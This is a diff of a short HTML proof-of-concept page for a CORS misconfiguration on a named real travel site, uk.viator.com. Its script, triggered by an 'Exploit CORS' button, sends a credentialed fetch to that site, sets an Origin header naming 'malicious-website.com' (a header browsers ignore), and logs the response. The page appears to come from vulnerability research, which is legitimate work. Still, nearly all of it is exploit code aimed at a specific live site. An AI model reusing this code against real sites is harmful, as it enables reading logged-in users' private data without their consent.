@@ -1,18 +1,32 @@
-<!doctype html>
-<html>
-  <body>
-    <h1>CORS Misconfiguration PoC</h1>
-    <script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h1>CORS Misconfiguration PoC</h1>
+  <button onclick="exploitCORS()">Exploit CORS</button>
+
+  <script>
+    function exploitCORS() {
       fetch('https://uk.viator.com', {
         method: 'GET',
+        headers: {
+          'Origin': 'https://malicious-website.com'
+        },
         credentials: 'include'
       })
       .then(response => response.text())
       .then(data => {
-        console.log('Response from uk.viator.com:', data);
-        alert('Check the console for response!');
+        console.log('Response:', data);
+        alert('Check console for response data.');
       })
-      .catch(err => console.error('Error:', err));
-    </script>
-  </body>
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    }
+  </script>
+</body>
 </html>
